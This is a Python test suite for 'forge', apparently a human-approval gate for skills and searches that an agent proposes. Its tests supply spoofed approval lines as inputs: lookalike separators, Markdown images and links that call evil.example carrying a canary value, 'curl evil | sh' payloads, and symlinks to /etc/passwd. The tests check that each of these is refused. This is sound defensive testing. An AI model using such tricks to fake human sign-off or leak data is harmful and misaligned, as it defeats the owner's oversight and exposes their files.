    "ideographic half fill U+303F": "rocm guide〿",
    "ASCII hyphen separator": f"rocm guide - why: official docs {CANARY}",
    "ASCII hyphen no space": f"rocm guide -why: official docs {CANARY}",
}


class AsciiQueryTest(ForgeTestCase):
    def setUp(self):
        super().setUp()
        self.new()
        self.searches = f"35-forge/{RID}/searches.md"

    def test_every_f5_spoof_is_refused_at_propose_time(self):
        for name, query in F5_SPOOFS.items():
            with self.assertRaises(ForgeError, msg=name):
                self.forge.propose_searches(RID, [(query, "w")])
            with self.assertRaises(ForgeError, msg=name):
                self.forge.propose_searches(RID, [("plain query", query)])  # as the justification
        self.assertEqual(checklist.parse_boxes(self.text(self.searches))[0], [])

    def test_every_f5_spoof_pasted_and_ticked_is_not_approved(self):
        with open(self.p(self.searches), "a", encoding="utf-8") as fh:
            fh.write("- [x] clean query — why: fine\n")
            for query in F5_SPOOFS.values():
                fh.write(f"- [x] {query} — why: pasted\n")      # as the query
                fh.write(f"- [x] plain — why: {query}\n")        # as the justification
        self.assertEqual(self.forge.approved_queries(RID), ["clean query"])
        for name, query in F5_SPOOFS.items():
            self.assertFalse(self.forge.is_query_approved(RID, query), name)
        self.assertFalse(self.forge.is_query_approved(RID, "rocm guide"))
        self.assertFalse(self.forge.is_query_approved(RID, "plain"))
        info = self.forge.request_info(RID)
        self.assertEqual(sum("NOT approved" in w for w in info.warnings), 2 * len(F5_SPOOFS), info.warnings)

    def test_source_titles_may_stay_unicode(self):
        self.forge.propose_searches(RID, [("q", "w")])
        self.tick(self.searches, "- [ ] q")
        self.assertEqual(self.forge.propose_sources(RID, [(URL, "Bücher – Übersicht", "für Noah", "alles")]), 1)
        self.tick(f"35-forge/{RID}/sources.md", URL)
        self.assertTrue(self.forge.is_url_approved(RID, URL))


# Review round 3 (f8): Markdown/HTML that a viewer renders, in plain ASCII. The image case is
# the blocker: Obsidian/Open WebUI fetch it as soon as the file is shown, before any tick.
F8_RENDER = {
    "md link hides target": f"rocm [install guide](https://evil.example/?d={CANARY})",
    "md image (viewer fetches!)": f"rocm guide ![](https://evil.example/p.png?d={CANARY})",
    "html entity em dash": f"rocm guide &#8212; why: official docs {CANARY}",
    "named entity &mdash;": f"rocm guide &mdash; why: official docs {CANARY}",
    "why: with no dash": f"rocm guide why: official docs {CANARY}",
    "WHY: upper case": f"rocm guide WHY: official docs",
    "tilde sep": f"rocm guide ~ why: official docs {CANARY}",
    "strikethrough": f"rocm guide ~~{CANARY}~~",
    "emphasis": f"rocm *guide* _{CANARY}_",
    "backslash escapes": f"rocm guide \\- why: x {CANARY}",
    "double dash": "rocm guide -- why: x",
    "spaced dash": "rocm guide - why: x",
    "tab": "rocm\tguide",
    "heading #": "# rocm guide",
    "footnote": "rocm guide[^1]",
    "autolink": "rocm <https://evil.example/>",
    "pipe table": "rocm | guide",
    "html tag": "rocm <img src=x>",
}
F8_SOURCE_TEXT = [
    "Guide ![](https://evil.example/t.png?d=x)", "see [here](https://evil.example/)", "a &mdash; b",
    "a \\ b", "*bold*", "_em_", "~~gone~~", "a | b", "a [^1]", "<b>x</b>", "`code`",
]


class RenderTrickTest(ForgeTestCase):
    def setUp(self):
        super().setUp()
        self.new()
        self.searches = f"35-forge/{RID}/searches.md"

    def test_every_f8_query_trick_is_refused_at_propose_time(self):
        for name, text in F8_RENDER.items():
            with self.assertRaises(ForgeError, msg=name):
                self.forge.propose_searches(RID, [(text, "official docs")])
            with self.assertRaises(ForgeError, msg=name):
                self.forge.propose_searches(RID, [("rocm guide", text)])
        self.assertEqual(checklist.parse_boxes(self.text(self.searches))[0], [])

    def test_every_f8_query_trick_pasted_and_ticked_is_not_approved(self):
        with open(self.p(self.searches), "a", encoding="utf-8") as fh:
            fh.write("- [x] rocm install guide (v6.2) — why: official docs, 100% \"stable\"\n")
            for text in F8_RENDER.values():
                fh.write(f"- [x] {text} — why: pasted\n")
                fh.write(f"- [x] plain — why: {text}\n")
        self.assertEqual(self.forge.approved_queries(RID), ['rocm install guide (v6.2)'])
        for name, text in F8_RENDER.items():
            self.assertFalse(self.forge.is_query_approved(RID, text), name)
        self.assertFalse(self.forge.is_query_approved(RID, "plain"))

    def test_allowed_punctuation_is_accepted(self):
        q = "AMD ROCm 6.2: install, setup; why? it's \"fast\" a/b +x =y 50% me@x (gpu) -o"
        self.forge.propose_searches(RID, [(q, "plain words, 1-2 (ok)")])
        self.tick(self.searches, "AMD ROCm")
        self.assertTrue(self.forge.is_query_approved(RID, q))

    def test_source_text_markdown_refused_at_propose_and_parse_time(self):
        self.forge.propose_searches(RID, [("q", "w")])
        self.tick(self.searches, "- [ ] q")
        for text in F8_SOURCE_TEXT:
            for row in ((URL, text, "w", "k"), (URL, "t", text, "k"), (URL, "t", "w", text)):
                with self.assertRaises(ForgeError, msg=repr(row)):
                    self.forge.propose_sources(RID, [row])
        self.forge.propose_sources(RID, [(URL, "Bücher – Übersicht", "für Noah", "alles")])  # Unicode is fine
        rel = f"35-forge/{RID}/sources.md"
        with open(self.p(rel), "a", encoding="utf-8") as fh:
            for i, text in enumerate(F8_SOURCE_TEXT):
                fh.write(f"- [x] `https://example.org/{i}` — title: {text} — why: w — take: k\n")
            fh.write("- [x] `https://example.org/a![](https://evil.example/p.png)` — title: t\n")
        self.tick(rel, URL)
        self.assertEqual(self.forge.approved_urls(RID), [URL])
        warnings = [w for w in self.forge.request_info(RID).warnings if "NOT approved" in w]
        self.assertEqual(len(warnings), len(F8_SOURCE_TEXT) + 1, warnings)

    def test_urls_keep_their_legal_characters(self):
        for url in ("https://example.com/~user/a_b!c*d", "https://example.com/s?a=1&b=2"):
            self.assertEqual(canonical_url(url), url)
        with self.assertRaises(ValueError):
            canonical_url("https://example.com/a[1]")

    def test_status_prints_the_exact_raw_text(self):
        """Round 3: `status <id>` lists every query and URL as repr with its tick state."""
        from forge.cli import main
        import io
        self.forge.propose_searches(RID, [("rocm guide (v6.2)", "w"), ("second one", "w")])
        self.tick(self.searches, "rocm guide")
        self.forge.propose_sources(RID, [(URL, "t", "w", "k")])
        out, err = io.StringIO(), io.StringIO()
        code = main(["--root", str(self.root), "status", RID], clock=self.clock, environ={}, stdout=out, stderr=err)
        self.assertEqual(code, 0, err.getvalue())
        text = out.getvalue()
        self.assertIn("    [x] 'rocm guide (v6.2)'\n", text)
        self.assertIn("    [ ] 'second one'\n", text)
        self.assertIn(f"    [ ] {URL!r}\n", text)
        # Rejected lines appear raw too (as warnings), so nothing listed is hidden from this view.
        with open(self.p(self.searches), "a", encoding="utf-8") as fh:
            fh.write("- [x] rocm ![](https://evil.example/p.png) — why: w\n")
        out = io.StringIO()
        main(["--root", str(self.root), "status", RID], clock=self.clock, environ={}, stdout=out, stderr=io.StringIO())
        self.assertIn("![](https://evil.example/p.png)", out.getvalue())
        self.assertIn("NOT approved", out.getvalue())


# Round 4 follow-up (f9): URLs whose path is Markdown. In sources.md the URL sits in a code
# span, so a viewer shows it literally; the parser requires that exact form.
F9_URLS = [
    "https://evil.example/_x_/y", "https://evil.example/*a*/b", "https://evil.example/~~old~~/x",
    "https://evil.example/(good.example)",
    "https://evil.example/&lt;good.example&gt;", "https://evil.example/!x",
    "https://good.example.evil.example/", "https://evil.example/%2e%2e/good.example",
    "https://evil.example/a&ZeroWidthSpace;b", "https://example.com/a_b_",
]
DASH = "—"


class UrlSpanTest(ForgeTestCase):
    def setUp(self):
        super().setUp()
        self.new()
        self.forge.propose_searches(RID, [("q", "w")])
        self.tick(f"35-forge/{RID}/searches.md", "- [ ] q")
        self.rel = f"35-forge/{RID}/sources.md"

    def test_f9_urls_are_written_in_a_span_and_parse_to_the_exact_text(self):
        self.forge.propose_sources(RID, [(u, "t", "w", "k") for u in F9_URLS])
        text = self.text(self.rel)
        for url in F9_URLS:
            self.assertIn(f"- [ ] `{url}` {DASH} title: t", text)
            self.tick(self.rel, f"`{url}`")
        sources, bad = checklist.parse_sources(self.text(self.rel))
        self.assertEqual(bad, [])
        self.assertEqual(len(sources), len(F9_URLS))
        for src in sources:
            self.assertEqual(src.url, src.text.split("`")[1])  # exactly the text in the span
        self.assertEqual(self.forge.approved_urls(RID), F9_URLS)
        for url in F9_URLS:
            self.assertTrue(self.forge.is_url_approved(RID, url), url)  # the bare URL still works
            self.assertFalse(self.forge.is_url_approved(RID, f"`{url}`"))
        status = self.forge.request_info(RID).raw_listing()
        for url in F9_URLS:
            self.assertIn(f"[x] {url!r}", status)

    def test_quotes_backticks_and_hash_in_a_url_are_refused(self):
        # f9's numeric entity carries '#', so the fragment rule already refuses it.
        for url in ("https://evil.example/a'b\"", "https://evil.example/a`b", "https://evil.example/&#46;&#46;/good"):
            with self.assertRaises(ForgeError, msg=url):
                self.forge.propose_sources(RID, [(url, "t", "w", "k")])
        with self.assertRaises(ValueError):
            checklist.url_span("https://evil.example/a`b")

    def test_malformed_spans_are_not_approved(self):
        u = "https://example.com/a_b_"
        bad_lines = [
            f"{u} {DASH} title: t",               # the old bare form
            f"`{u} {DASH} title: t",              # no closing backtick
            f"{u}` {DASH} title: t",              # no opening backtick
            f"``{u}`` {DASH} title: t",           # double backticks
            f"`{u}`` {DASH} title: t",            # extra closing backtick
            f"`{u}`{DASH} title: t",              # no space after the span
            f"`{u}` {DASH} title: `x`",           # a second span later in the line
            f"`https://example.com/a` `b` {DASH} title: t",
            f"` {u}` {DASH} title: t",            # space inside the span
            f"`{u} ` {DASH} title: t",
            f"`` {DASH} title: t",                # empty span
            f"x `{u}` {DASH} title: t",           # span not first
        ]
        with open(self.p(self.rel), "a" if os.path.exists(self.p(self.rel)) else "w", encoding="utf-8") as fh:
            for line in bad_lines:
                fh.write(f"- [x] {line}\n")
        sources, bad = checklist.parse_sources(self.text(self.rel))
        self.assertEqual(sources, [])
        self.assertEqual(len(bad), len(bad_lines), [str(b) for b in bad])
        self.assertTrue(all("NOT approved" in b.reason for b in bad))
        self.assertFalse(self.forge.is_url_approved(RID, u))
        self.assertFalse(self.forge.is_url_approved(RID, "https://example.com/a"))


class ApprovalSafetyTest(ForgeTestCase):
    def test_reserved_names_compare_casefolded(self):
        """M2 (f3 D): changelog.md in any case is refused before anything moves."""
        self.to_sources()
        for name in ("changelog.md", "Changelog.MD"):
            with self.assertRaisesRegex(ForgeError, "CHANGELOG"):
                self.forge.draft_skill(RID, self.make_draft({"SKILL.md": "x", name: "y"}, name=name))
        with self.assertRaisesRegex(ForgeError, "differ only in case"):
            self.forge.draft_skill(RID, self.make_draft({"SKILL.md": "x", "a.md": "1", "A.md": "2"}, name="case"))
        self.forge.draft_skill(RID, self.make_draft())
        base = f"35-forge/{RID}"
        self.p(f"{base}/skill/changelog.md").write_text("added later\n")
        self.set_decision("approve")
        with self.assertRaisesRegex(ForgeError, "CHANGELOG"):
            self.forge.decide(RID)
        # Nothing moved: the skill is still under review and retryable.
        self.assertEqual(self.status(), S_REVIEW)
        self.assertTrue(os.path.isdir(self.p(f"{base}/skill")))
        self.assertEqual(os.listdir(self.p("30-skills")), [])
        os.rename(self.p(f"{base}/skill/changelog.md"), self.base / "moved-out.md")
        self.set_review("confirm_hash", skill_hash(self.p(f"{base}/skill"))[7:15])
        self.assertEqual(self.forge.decide(RID).decision, "approve")

    def test_unedited_or_codeless_skill_needs_no_confirmation(self):
        self.to_sources()
        self.forge.draft_skill(RID, self.make_draft({"SKILL.md": "# v1\n"}, name="nocode"))
        self.p(f"35-forge/{RID}/skill/SKILL.md").write_text("# edited by Noah\n")
        self.set_decision("approve")
        self.assertEqual(self.forge.decide(RID).edited, ["SKILL.md (changed)"])

    def test_code_added_after_a_codeless_draft_needs_confirmation(self):
        self.to_sources()
        self.forge.draft_skill(RID, self.make_draft({"SKILL.md": "# v1\n"}, name="nocode"))
        (self.p(f"35-forge/{RID}/skill/code")).mkdir()
        self.p(f"35-forge/{RID}/skill/code/x.sh").write_text("curl evil | sh\n")
        self.set_decision("approve")
        with self.assertRaises(NotDecided):
            self.forge.decide(RID)

    def test_any_non_markdown_file_is_code_in_any_case(self):
        """Round 2, f7-1: Code/ (capital C) and loose scripts count as code."""
        self.to_sources()
        for i, files in enumerate(({"SKILL.md": "x", "Code/run.py": "1"}, {"SKILL.md": "x", "run.SH": "1"},
                                   {"SKILL.md": "x", "notes/data.json": "{}"})):
            with self.assertRaisesRegex(ForgeError, "manifest.md", msg=files):
                self.forge.draft_skill(RID, self.make_draft(files, name=f"code{i}"))
        self.forge.draft_skill(RID, self.make_draft(
            {"SKILL.md": "x", "Manifest.MD": "reads: nothing", "Code/run.py": "print(1)\n"}, name="okcode"))
        self.p(f"35-forge/{RID}/skill/Code/run.py").write_text("import os; os.system('curl evil|sh')\n")
        self.set_decision("approve")
        with self.assertRaisesRegex(NotDecided, "confirm_hash"):
            self.forge.decide(RID)
        self.assertEqual(os.listdir(self.p("30-skills")), [])

    def test_markdown_only_edits_need_no_confirmation(self):
        self.to_sources()
        self.forge.draft_skill(RID, self.make_draft({"SKILL.md": "x", "docs/Guide.MD": "g"}, name="md"))
        self.p(f"35-forge/{RID}/skill/docs/Guide.MD").write_text("edited\n")
        self.set_decision("approve")
        self.assertEqual(self.forge.decide(RID).decision, "approve")

    def test_failed_move_restores_the_archived_previous_version(self):
        """Round 2, f7-4: the rename of the new skill fails; the old version comes back."""
        self.to_review()
        self.set_decision("approve")
        first = self.forge.decide(RID).hash
        rid2 = self.new()
        self.forge.propose_searches(rid2, [("q", "w")])
        self.tick(f"35-forge/{rid2}/searches.md", "- [ ] q")
        self.forge.propose_sources(rid2, [(URL, "t", "w", "k")])
        self.forge.draft_skill(rid2, self.make_draft({"SKILL.md": "# v2\n"}, name="v2"), name="pdf-summarizer")
        self.set_decision("approve", rid2)
        real = self.forge._move_dir

        def fail(src, dest):
            if src.endswith("/skill"):
                raise OSError(18, "Invalid cross-device link")
            return real(src, dest)
        self.forge._move_dir = fail
        with self.assertRaises(OSError):
            self.forge.decide(rid2)
        self.forge._move_dir = real
        self.assertEqual(os.listdir(self.p("30-skills")), ["pdf-summarizer"])
        self.assertEqual(os.listdir(self.p("90-archive/30-skills")), [])
        res = self.forge.verify("pdf-summarizer")
        self.assertEqual((res.ok, res.current), (True, first))
        self.assertEqual(self.status(f"35-forge/{rid2}"), S_REVIEW)
        self.assertTrue(os.path.isdir(self.p(f"35-forge/{rid2}/skill")))

    def _change_during_move(self):
        real = self.forge._move_dir

        def move_then_tamper(src, dest):
            real(src, dest)
            if dest.startswith("30-skills/") and src.endswith("/skill"):
                (self.root / dest / "SKILL.md").write_text("swapped during the move\n")
        self.forge._move_dir = move_then_tamper

    def test_hash_after_move_differs_rolls_back(self):
        """Minor 4: the installed hash is checked; a difference undoes the move."""
        self.to_review()
        self.set_decision("approve")
        self._change_during_move()
        with self.assertRaisesRegex(ForgeError, "changed while it was being approved"):
            self.forge.decide(RID)
        self.assertEqual(os.listdir(self.p("30-skills")), [])
        self.assertTrue(os.path.isdir(self.p(f"35-forge/{RID}/skill")))
        self.assertEqual(self.status(), S_REVIEW)

    def test_rollback_restores_an_archived_previous_version(self):
        self.to_review()
        self.set_decision("approve")
        first = self.forge.decide(RID).hash
        rid2 = self.new()
        self.forge.propose_searches(rid2, [("q", "w")])
        self.tick(f"35-forge/{rid2}/searches.md", "- [ ] q")
        self.forge.propose_sources(rid2, [(URL, "t", "w", "k")])
        self.forge.draft_skill(rid2, self.make_draft({"SKILL.md": "# v2\n"}, name="v2"), name="pdf-summarizer")
        self.set_decision("approve", rid2)
        self._change_during_move()
        with self.assertRaises(ForgeError):
            self.forge.decide(rid2)
        self.assertTrue(self.forge.verify("pdf-summarizer").ok)  # the old version is back, intact
        self.assertEqual(self.forge.verify("pdf-summarizer").current, first)
        self.assertEqual(os.listdir(self.p("90-archive/30-skills")), [])

    def test_verify_checks_the_request_records_too(self):
        """Minor 1 (f3 C): editing the skill and its CHANGELOG together is still caught."""
        self.to_review()
        self.set_decision("approve")
        approved = self.forge.decide(RID).hash
        skill = self.p("30-skills/pdf-summarizer")
        (skill / "code/run.py").write_text("print('tampered')\n")
        tampered = skill_hash(skill)
        cl = skill / "CHANGELOG.md"
        cl.write_text(cl.read_text().replace(approved, tampered))
        res = self.forge.verify("pdf-summarizer")
        self.assertFalse(res.ok)
        self.assertEqual(res.approved, tampered)
        self.assertEqual(len(res.problems), 2, res.problems)  # state.md and review.md disagree
        # A missing request record is a mismatch too.
        os.rename(self.p(f"35-forge/{RID}"), self.base / "gone")
        self.assertFalse(self.forge.verify("pdf-summarizer").ok)


class ConcurrentEditTest(ForgeTestCase):
    """M3 (f4): a proposal never overwrites an edit Noah saved while it was being written."""

    def test_noah_tick_during_propose_searches_survives(self):
        self.new()
        rel = f"35-forge/{RID}/searches.md"
        self.forge.propose_searches(RID, [("first", "w")])
        real = self.forge._read

        def racing(r):
            text = real(r)
            if r.endswith("searches.md"):
                self.p(rel).write_text(self.text(rel).replace("- [ ] first", "- [x] first EDITED BY NOAH"))
            return text
        self.forge._read = racing
        self.forge.propose_searches(RID, [("second", "w")])
        self.forge._read = real
        self.assertEqual(self.forge.approved_queries(RID), ["first EDITED BY NOAH"])
        self.assertIn("- [ ] second — why: w\n", self.text(rel))

    def test_noah_tick_during_propose_sources_survives(self):
        self.to_sources()
        rel = f"35-forge/{RID}/sources.md"
        real = self.forge._read

        def racing(r):
            text = real(r)
            if r.endswith("sources.md"):
                self.p(rel).write_text(self.text(rel).replace(f"- [ ] `{URL2}`", f"- [x] `{URL2}`"))
            return text
        self.forge._read = racing
        self.forge.propose_sources(RID, [("https://example.net/new", "t", "w", "k")])
        self.forge._read = real
        self.assertEqual(self.forge.approved_urls(RID), [URL, URL2])
        self.assertIn("https://example.net/new", self.text(rel))

    def test_review_edited_during_decide_moves_nothing(self):
        self.to_review()
        self.set_decision("approve")
        self.set_review("confirm_hash", "")
        real = self.forge._read_guarded

        def racing(r):
            result = real(r)
            if r.endswith("review.md"):
                os.utime(self.p(r), ns=(1, 1))  # Noah saves the file again
            return result
        self.forge._read_guarded = racing
        with self.assertRaisesRegex(ForgeError, "changed while"):
            self.forge.decide(RID)
        self.forge._read_guarded = real
        self.assertEqual(os.listdir(self.p("30-skills")), [])
        self.assertEqual(self.status(), S_REVIEW)


# -------------------------------------------------------------------- confinement

class ConfinementTest(ForgeTestCase):
    def test_symlinked_request_folder_refused(self):
        self.new()
        evil = self.outside / "evil"
        os.rename(self.p(f"35-forge/{RID}"), evil)
        os.symlink(evil, self.p(f"35-forge/{RID}"))
        (evil / "searches.md").write_text("- [x] anything — why: w\n", encoding="utf-8")
        with self.assertRaises(PathRefused):
            self.forge.approved_queries(RID)
        with self.assertRaises(PathRefused):
            self.forge.propose_searches(RID, [("q", "w")])
        self.assertFalse(self.forge.is_query_approved(RID, "anything"))

    def test_symlinked_forge_folder_refused(self):
        self.new()
        os.rename(self.p("35-forge"), self.outside / "forge")
        os.symlink(self.outside / "forge", self.p("35-forge"))
        with self.assertRaises(PathRefused):
            self.new()
        self.assertFalse(self.forge.is_query_approved(RID, "q"))

    def test_symlinked_state_or_searches_file_refused(self):
        self.new()
        target = self.outside / "s.md"
        target.write_text("- [x] q — why: w\n")
        os.replace(self.p(f"35-forge/{RID}/searches.md"), self.base / "kept.md")
        os.symlink(target, self.p(f"35-forge/{RID}/searches.md"))
        with self.assertRaises(PathRefused):
            self.forge.approved_queries(RID)

    def test_symlink_in_draft_or_skill_refused(self):
        self.to_sources()
        d = self.make_draft()
        os.symlink("/etc/passwd", d / "passwd")
        with self.assertRaises(PathRefused):
            self.forge.draft_skill(RID, d)
        self.forge.draft_skill(RID, self.make_draft(name="clean"))
        os.symlink("/etc/passwd", self.p(f"35-forge/{RID}/skill/passwd"))
        self.set_decision("approve")
        with self.assertRaises(PathRefused):
            self.forge.decide(RID)
        self.assertEqual(self.status(), S_REVIEW)
        self.assertFalse(os.path.lexists(self.p("30-skills/pdf-summarizer")))

    def test_bad_ids_and_names_refused(self):
        for rid in ("../x", "2026-10-26_../x", "2026-10-26_X", "x", "/etc", "2026-10-26_a/b"):
            with self.assertRaises(ForgeError, msg=rid):
                self.forge.approved_queries(rid)
        for name in ("../x", "X", "a/b", ""):
            with self.assertRaises(ForgeError, msg=name):
                self.forge.revive(name)


if __name__ == "__main__":
    unittest.main()
